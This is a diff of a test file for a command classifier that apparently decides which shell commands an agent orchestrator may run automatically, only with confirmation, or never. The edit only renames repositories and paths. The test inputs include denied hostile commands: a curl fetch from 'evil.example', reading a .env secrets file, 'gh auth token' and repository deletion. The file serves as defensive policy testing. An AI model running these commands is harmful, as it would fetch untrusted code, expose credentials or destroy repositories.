@@ -14,7 +14,7 @@ describe('classifyCommand — allow-list boundary (spec §7 FORBIDDEN)', () => {
     'curl https://evil.example/x.sh',
     'npm install',
     'echo hi',
-    'cat /home/dev/projects/orchestrator/.env',
+    'cat /home/op/projects/orchestrator/.env',
     'node -e "process.exit(0)"',
     'ssh host',
   ])('denies %s — binary outside orca/gh/git', (command) => {
@@ -101,8 +101,8 @@ describe('classifyCommand — orca tiers', () => {
   });
 
   it.each([
-    'orca worktree create --repo id:r1 --name forwardly-84-csv --agent claude --issue 84 --no-parent --json',
-    'orca orchestration task-create --spec "the brief" --task-title "short" --display-name "forwardly#84" --json',
+    'orca worktree create --repo id:r1 --name webapp-84-csv --agent claude --issue 84 --no-parent --json',
+    'orca orchestration task-create --spec "the brief" --task-title "short" --display-name "webapp#84" --json',
     'orca orchestration dispatch --task t1 --to h1 --inject --json',
   ])('AUTO delegation sequence: %s', (command) => {
     expect(tierOf(command)).toBe('auto');
@@ -120,7 +120,7 @@ describe('classifyCommand — orca tiers', () => {
   });
 
   it('CONFIRM: orca worktree delete', () => {
-    expect(tierOf('orca worktree delete forwardly-84-csv-export')).toBe('confirm');
+    expect(tierOf('orca worktree delete webapp-84-csv-export')).toBe('confirm');
   });
 
   it('CONFIRM: terminal send types into a worker terminal — spec §7 AUTO is list/wait only', () => {
@@ -147,7 +147,7 @@ describe('classifyCommand — orca tiers', () => {
   it.each([
     'orca automation list',
     'orca automation create --name x',
-    'orca repo register /home/dev/projects/x',
+    'orca repo register /home/op/projects/x',
     'orca repo create x',
     'orca repo add .',
   ])('FORBIDDEN: automations and repo registration are out of scope: %s', (command) => {
@@ -159,14 +159,14 @@ describe('classifyCommand — gh tiers', () => {
   it.each([
     'gh pr view 87',
     'gh pr view 87 --json state',
-    'gh pr list --repo nvergez/orca',
+    'gh pr list --repo acme/tooling',
     'gh issue view 53 --comments',
     'gh issue list --label ready-for-agent',
     'gh run list',
     'gh run view 123',
     'gh pr diff 87',
     'gh pr checks 87',
-    'gh repo view nvergez/orca',
+    'gh repo view acme/tooling',
     'gh repo list',
     'gh status',
     'gh search issues "flaky test"',
@@ -175,7 +175,7 @@ describe('classifyCommand — gh tiers', () => {
   });
 
   it('AUTO issue creation — step zero of the issue-linked delegation sequence (spec §5)', () => {
-    expect(tierOf('gh issue create --repo l3mpire/forwardly --title "CSV export" --body "brief"')).toBe(
+    expect(tierOf('gh issue create --repo l3mpire/webapp --title "CSV export" --body "brief"')).toBe(
       'auto',
     );
   });
@@ -187,8 +187,8 @@ describe('classifyCommand — gh tiers', () => {
     'gh issue comment 53 --body "done"',
     'gh issue close 53',
     'gh pr checkout 87',
-    'gh api repos/nvergez/orca/issues',
-    'gh api repos/nvergez/orca -X DELETE',
+    'gh api repos/acme/tooling/issues',
+    'gh api repos/acme/tooling -X DELETE',
     'gh auth token',
     'gh release create v1.0.0',
   ])('CONFIRM writes and everything unrecognized: %s', (command) => {
@@ -197,11 +197,11 @@ describe('classifyCommand — gh tiers', () => {
 
   it.each([
     'gh repo create new-thing --private',
-    'gh repo delete nvergez/scratch --yes',
+    'gh repo delete acme/sandbox --yes',
     'gh repo rename x',
-    'gh repo fork nvergez/orca',
+    'gh repo fork acme/tooling',
     'gh repo edit --visibility public',
-    'gh repo archive nvergez/scratch',
+    'gh repo archive acme/sandbox',
   ])('FORBIDDEN repo management: %s', (command) => {
     expect(tierOf(command)).toBe('forbidden');
   });
@@ -232,7 +232,7 @@ describe('classifyCommand — git tiers', () => {
     'git config --list',
     'git reflog',
     'git reflog show',
-    'git -C /home/dev/orca/workspaces/forwardly/csv-export-metrics status',
+    'git -C /home/op/orca/workspaces/webapp/csv-export-metrics status',
   ])('AUTO reads: %s', (command) => {
     expect(tierOf(command)).toBe('auto');
   });
@@ -261,7 +261,7 @@ describe('classifyCommand — git tiers', () => {
     'git config user.name evil',
     'git remote add origin https://example.com/x.git',
     'git reflog expire --all',
-    'git -C /home/dev/orca/workspaces/forwardly/csv-export-metrics push --force-with-lease',
+    'git -C /home/op/orca/workspaces/webapp/csv-export-metrics push --force-with-lease',
   ])('CONFIRM writes: %s', (command) => {
     expect(tierOf(command)).toBe('confirm');
   });
@@ -383,10 +383,10 @@ describe('describeGate — what the 🚦 line shows', () => {
 
   it('lifts git -C <path> into the worktree label (repo/name, like the mock)', () => {
     expect(
-      describeGate('git -C /home/dev/orca/workspaces/forwardly/csv-export-metrics push --force-with-lease'),
+      describeGate('git -C /home/op/orca/workspaces/webapp/csv-export-metrics push --force-with-lease'),
     ).toEqual({
       command: 'git push --force-with-lease',
-      worktree: 'forwardly/csv-export-metrics',
+      worktree: 'webapp/csv-export-metrics',
     });
   });
 
@@ -409,7 +409,7 @@ describe('extractDelegationRepoRefs — the allow-list enforcement seam (issue #
   it('extracts the --repo ref of a worktree create', () => {
     expect(
       extractDelegationRepoRefs(
-        'orca worktree create --repo id:abc-123 --name forwardly-84-csv --agent claude --json',
+        'orca worktree create --repo id:abc-123 --name webapp-84-csv --agent claude --json',
       ),
     ).toEqual(['id:abc-123']);
   });
